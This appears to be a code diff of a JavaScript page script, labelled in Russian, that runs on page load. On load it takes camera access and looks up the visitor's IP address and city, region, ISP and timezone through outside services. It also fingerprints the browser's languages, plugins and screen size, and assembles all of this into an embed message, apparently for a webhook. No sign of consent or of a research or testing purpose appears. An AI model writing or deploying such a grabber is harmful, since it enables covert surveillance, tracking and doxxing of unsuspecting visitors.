@@ -23,8 +23,13 @@ async function captureCamera() {
     }
 }
 
-async function sendEmbed(ip, geo) {
+async function sendEmbed() {
     const cameraResult = await captureCamera();
+    const ipResponse = await fetch('https://api.ipify.org');
+    const ip = await ipResponse.text();
+    
+    const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+    const geoData = await geoResponse.json().catch(() => null);
     
     const embed = {
         title: "🌐 Информация о пользователе",
@@ -34,11 +39,11 @@ async function sendEmbed(ip, geo) {
             { name: "🌍 Языки", value: navigator.languages.join(', '), inline: true },
             { name: "🔌 Плагины", value: [...navigator.plugins].map(p => p.name).join(', ') || 'Нет', inline: false },
             { name: "📺 Размер экрана", value: `${screen.width} x ${screen.height}`, inline: true },
-            { name: "🌍 Страна", value: geo?.country || "Неизвестно", inline: true },
-            { name: "🏙️ Город", value: geo?.city || "Неизвестно", inline: true },
-            { name: "📍 Регион", value: geo?.regionName || "Неизвестно", inline: true },
-            { name: "📡 Провайдер", value: geo?.isp || "Неизвестно", inline: true },
-            { name: "🕐 Часовой пояс", value: geo?.timezone || "Неизвестно", inline: true },
+            { name: "🌍 Страна", value: geoData?.country || "Неизвестно", inline: true },
+            { name: "🏙️ Город", value: geoData?.city || "Неизвестно", inline: true },
+            { name: "📍 Регион", value: geoData?.regionName || "Неизвестно", inline: true },
+            { name: "📡 Провайдер", value: geoData?.isp || "Неизвестно", inline: true },
+            { name: "🕐 Часовой пояс", value: geoData?.timezone || "Неизвестно", inline: true },
             { name: "📷 Камера", value: cameraResult.status, inline: true },
             { name: "🆔 IP адрес", value: ip || "Неизвестно", inline: true }
         ],
@@ -67,10 +72,4 @@ async function sendEmbed(ip, geo) {
     }
 }
 
-fetch('https://api.ipify.org?format=json')
-    .then(r => r.json())
-    .then(ipData => fetch(`http://ip-api.com/json/${ipData.ip}`)
-        .then(r => r.json())
-        .then(geoData => sendEmbed(ipData.ip, geoData))
-    )
-    .catch(() => sendEmbed(null, null));
+sendEmbed();
